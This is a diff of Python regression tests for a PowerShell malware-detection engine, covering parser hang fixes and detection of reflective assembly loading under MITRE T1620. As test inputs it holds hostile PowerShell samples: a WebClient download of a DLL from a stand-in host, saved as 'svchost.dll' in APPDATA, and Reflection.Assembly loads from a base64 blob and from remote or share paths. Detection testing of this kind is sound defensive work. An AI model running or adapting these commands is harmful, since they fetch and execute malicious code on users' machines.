@@ -1,51 +1,37 @@
-"""RC5 · Phase 9.5d · Parser coverage gaps documented as regression tests.
+"""RC5 · Semantic coverage gaps — resolved regression tests (Feb 2026).
 
-Every sample the corpus exposes as a semantic gap gets a dedicated
-regression test here so:
+Previously two `xfail(strict=True)` cases lived here as tombstones for
+known parser / detector gaps. Both were resolved in the Feb-2026
+Correctness sprint (Priority 1 of the post-Phase-11.2 plan):
 
-  1. The gap is DOCUMENTED (via `xfail` marker with a clear reason),
-     which prevents accidental re-introduction of the same bug once
-     the fix ships.
-  2. Any accidental fix can be caught by removing the `xfail` marker
-     and watching the test start passing.
-  3. The Golden Corpus stays green (100%) while the roadmap of
-     post-cutover coverage items is machine-tracked.
+  1. **Parser hang on `$env:VAR + '...'` in expression context** —
+     fixed in `powershell_parser._parse_call_args` by consuming binary
+     operators between atoms. Also added an anti-hang safeguard in the
+     top-level parse loop.
+  2. **`[Reflection.Assembly]::Load(...)` semantic detection** — fixed
+     in `powershell_interpreter._materialize_member` by emitting a
+     dedicated `NodeKind.reflection` ExecNode; the MITRE mapper now
+     emits T1620 (Reflective Code Loading) for the `defense_evasion /
+     reflection` behavior sub-kind.
 
-Currently tracked gaps (all charter-blocked during shadow-run):
-
-  * `$env:APPDATA + '\\...'` — `$env:VAR` scope reference used inside
-    an expression concatenation currently hangs the deterministic
-    PowerShell tokenizer. Tokens for `$env:` followed by a literal-string
-    concat aren't consumed correctly. Fix requires parser work → post-cutover.
-  * `[Reflection.Assembly]::Load([Convert]::FromBase64String(...))` —
-    reflective PE loading in memory should emit a ReflectionNode /
-    T1620 (Reflective Code Loading) mapping. Not implemented.
-
-If any of these tests starts passing spontaneously, remove the `xfail`
-marker and update the corpus expectation to Malicious.
+These tests now run as positive assertions (no `xfail`) and will
+fail loudly if either fix regresses.
 """
 from __future__ import annotations
 
 import signal
 
-import pytest
+from engine.parsers.powershell_parser import PowerShellParser
+from engine.interpreters.powershell_interpreter import PowerShellInterpreter
+from engine.detectors.behavior_extractor import extract_behaviors
+from engine.detectors.mitre_mapper import map_behaviors_to_mitre
+from engine.detectors.verdict_v2 import compute_verdict
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="Parser hangs on `$env:VAR + '...'` in expression context. "
-           "Coverage gap tracked for post-cutover; see GC-275 in "
-           "golden_corpus_expansion_r2.py which simplifies the sample.",
-)
+# ---------------------------------------------------------------------------
+# Parser hang fix — `$env:VAR + '...'` in method-call argument context.
+# ---------------------------------------------------------------------------
 def test_env_var_expression_concat_parses_within_2s():
-    """This test proves the parser hang. It's `xfail` on purpose — the
-    day the parser fix ships, this test will START PASSING, at which
-    point the strict `xfail` marker will FAIL the build, forcing us
-    to update the corpus expectation for GC-275 back to its original
-    variant with `$env:APPDATA` concatenation.
-    """
-    from engine.parsers.powershell_parser import PowerShellParser
-
     src = (
         r"$w = New-Object System.Net.WebClient; "
         r"$w.DownloadFile('http://trick.tld/x.dll', $env:APPDATA + '\svchost.dll')"
@@ -58,36 +44,77 @@ def test_env_var_expression_concat_parses_within_2s():
     signal.alarm(2)
     try:
         sir = PowerShellParser().parse(src)
-        # If we get here, the parser did NOT hang — either the gap has
-        # been fixed OR the parser fast-failed. Sanity-check that at
-        # least one statement was produced.
-        assert len(sir.root.children) >= 1
+        assert len(sir.root.children) >= 2
+        # No hang-safeguard warnings should have fired.
+        assert not any("no-advance" in w for w in (sir.warnings or ())), (
+            "hang-safeguard fired — parser did not consume the input cleanly"
+        )
     finally:
         signal.alarm(0)
 
 
-@pytest.mark.xfail(
-    strict=True,
-    reason="[Reflection.Assembly]::Load(...) does not emit a "
-           "ReflectionNode / T1620 mapping — new detection rule blocked "
-           "by shadow-run charter. Tracked for post-cutover.",
-)
-def test_reflection_assembly_load_emits_suspicious_verdict():
-    """Ensures a reflective PE-load sample rates at least Suspicious
-    once T1620 mapping ships.
-    """
-    from engine.parsers.powershell_parser import PowerShellParser
-    from engine.interpreters.powershell_interpreter import PowerShellInterpreter
-    from engine.detectors.behavior_extractor import extract_behaviors
-    from engine.detectors.mitre_mapper import map_behaviors_to_mitre
-    from engine.detectors.verdict_v2 import compute_verdict
+def test_env_var_arg_no_hang_variants():
+    """Broader coverage: `$env:VAR + expr` inside various call shapes."""
+    cases = [
+        "$obj.Method($env:APPDATA + 'x')",
+        "$obj.Method($env:USERPROFILE + '\\a', 'literal')",
+        "$obj.Method('lit', $env:TEMP + '\\b')",
+        "$obj.Method($a + $b + $env:HOME)",
+    ]
+    for src in cases:
+        signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(TimeoutError()))
+        signal.alarm(2)
+        try:
+            sir = PowerShellParser().parse(src)
+            assert sir.root.children, f"empty parse for {src!r}"
+        finally:
+            signal.alarm(0)
 
-    src = (
-        r'[Reflection.Assembly]::Load([Convert]::FromBase64String'
-        r'("TVqQAAMAAAAEAAAA...ABCDE"))'
+
+# ---------------------------------------------------------------------------
+# Reflective PE-load detection.
+# ---------------------------------------------------------------------------
+def test_reflection_assembly_load_emits_reflection_node():
+    from engine.exec_graph import NodeKind
+    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
+    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
+    assert any(n.kind == NodeKind.reflection for n in g.nodes), (
+        "no ReflectionNode emitted for [Reflection.Assembly]::Load"
     )
+
+
+def test_reflection_assembly_load_emits_suspicious_verdict():
+    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
     g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
     b = extract_behaviors(g)
     m = map_behaviors_to_mitre(b)
     v = compute_verdict(b, m, [])
-    assert v.verdict.value in ("Suspicious", "Malicious", "Critical")
+    assert v.verdict.value in ("Suspicious", "Malicious", "Critical"), (
+        f"expected ≥ Suspicious for reflective PE-load, got {v.verdict.value}"
+    )
+
+
+def test_reflection_maps_to_t1620():
+    src = r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))'
+    g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
+    m = map_behaviors_to_mitre(extract_behaviors(g))
+    techniques = {x.technique_id for x in m}
+    assert "T1620" in techniques, (
+        f"expected T1620 (Reflective Code Loading) in {techniques}"
+    )
+
+
+def test_reflection_variants_all_detected():
+    """LoadFile, LoadFrom, LoadWithPartialName all emit ReflectionNode."""
+    from engine.exec_graph import NodeKind
+    cases = [
+        r'[Reflection.Assembly]::LoadFile("C:\Users\Public\evil.dll")',
+        r'[Reflection.Assembly]::LoadFrom("http://mal/evil.dll")',
+        r'[System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation")',
+        r'[Reflection.Assembly]::UnsafeLoadFrom("\\share\evil.dll")',
+    ]
+    for src in cases:
+        g = PowerShellInterpreter().interpret(PowerShellParser().parse(src))
+        assert any(n.kind == NodeKind.reflection for n in g.nodes), (
+            f"no ReflectionNode for {src!r}"
+        )
